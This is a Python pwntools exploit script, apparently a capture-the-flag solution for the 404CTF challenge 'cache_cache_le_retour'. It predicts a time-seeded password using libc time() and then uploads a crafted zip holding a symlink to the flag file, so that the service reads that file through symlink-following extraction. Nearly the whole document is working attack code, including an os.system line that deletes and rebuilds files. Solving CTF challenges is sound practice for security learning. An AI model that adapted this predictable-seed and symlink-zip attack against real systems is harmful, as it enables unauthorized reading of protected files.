#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
import ctypes
import base64
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

context.update(arch="amd64", os="linux")

exe = ELF("cache_cache_le_retour")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challenges.404ctf.fr", "31725"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

p.recvuntil('toc\n', drop=True)
val = LIBC.time(0)

print('val = '+str(val))
q = process('./t1 '+str(val), shell=True)
passwd = q.recvuntil('\n',drop=True)
print(b'pass = '+passwd)
q.close()

sla('passe ?', passwd)

# name of flag

fname = 'salle_au_tresor'
os.system('mkdir arc;rm mystere.zip;cd arc;ln -fs '+fname+' surprise.txt;zip --symlinks ../mystere.zip surprise.txt;cd ..;rm -fr arc')

f = open('mystere.zip', 'rb')
buff = f.read()
f.close()

p.recvuntil('couloir.\n', drop=True)


p.sendline(base64.b64encode(buff))

p.interactive()

